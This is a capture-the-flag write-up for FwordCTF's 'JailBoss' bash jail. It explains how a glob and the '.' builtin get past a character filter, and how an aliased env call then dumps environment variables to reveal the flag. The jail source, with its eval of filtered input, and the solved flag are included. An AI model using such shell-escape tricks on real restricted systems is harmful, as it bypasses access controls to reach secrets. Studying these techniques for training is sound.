# bash / JailBoss

> Points: 447

## Question

> Fwordtask.sh is in the same directory as you. Maybe it will help you.

## Solution

Connecting to the box reveals a very restricted shell that appears to return `No No not that easy`
to basically anything. The source is provided, so we can check that.

```text
 ____    _    ____  _   _       _   _    ___ _
| __ )  / \  / ___|| | | |     | | / \  |_ _| |     __  __
|  _ \ / _ \ \___ \| |_| |  _  | |/ _ \  | || |     \ \/ /
| |_) / ___ \ ___) |  _  | | |_| / ___ \ | || |___   >  <
|____/_/   \_\____/|_| |_|  \___/_/   \_\___|_____| /_/\_\

 _____                       _
|  ___|_      _____  _ __ __| |
| |_  \ \ /\ / / _ \| '__/ _` |
|  _|  \ V  V / (_) | | | (_| |
|_|     \_/\_/ \___/|_|  \__,_|

Welcome! Kudos to Anis_Boss Senpai
>> ls
ls
No No not that easy
>> man
man
No No not that easy
>>
```

It appears that if we include any character that isn't one of `./ ?a` it will reject the input.
It also rejects the input if there are more than one `a`'s, more than one `/`'s, or more than two
`.`'s. This is really annoying because `grep` is counting any word character as `.`, so we are
functionally stuck with two "real" characters to type a command (one `.` and one `a`).
Curiously, `?` _doesn't_ count as a word character but `/` does.

Since we know that `taskFword.sh` is in the current directory, the Bash glob `?a??????????`
will select it. We can't run this using `./?a??????????` since that has three word characters,
so we instead use the Bash `.` builtin:

```text
>> . ?a??????????
A useless script for a useless SysAdmin
```

The flag is now in an environment variable. Noticing that `a` is aliased to `env`, we can just
run `a` to get all the current environment variables and copy our flag.

```text
>> a
SHELL=/opt/jail.sh
...
FLAG=FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}
...
```

### Source

#### `jail.sh`

```bash
#!/bin/bash
figlet "BASH JAIL x Fword"
echo "Welcome! Kudos to Anis_Boss Senpai"
function a(){
/usr/bin/env
}
export -f a
function calculSlash(){
    echo $1|grep -o "/"|wc -l
}
function calculPoint(){
    echo $1|grep -o "."|wc -l
}
function calculA(){
        echo $1|grep -o "a"|wc -l
}

while true;do
read -p ">> " input ;
if echo -n "$input"| grep -v -E "^(\.|\/| |\?|a)*$" ;then
        echo "No No not that easy "
else
    pts=$(calculPoint $input)
    slash=$(calculSlash $input)
    nbA=$(calculA $input)
    if [[ $pts -gt 2 || $slash -gt 1 || $nbA -gt 1 ]];then
        echo "That's Too much"
    else
        eval "$input"
    fi
fi
done
```

#### `taskFword.sh`

```bash
#!/bin/bash
export FLAG="FwordCTF{REDACTED}"
echo "A useless script for a useless SysAdmin"
```

### Flag

`FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}`
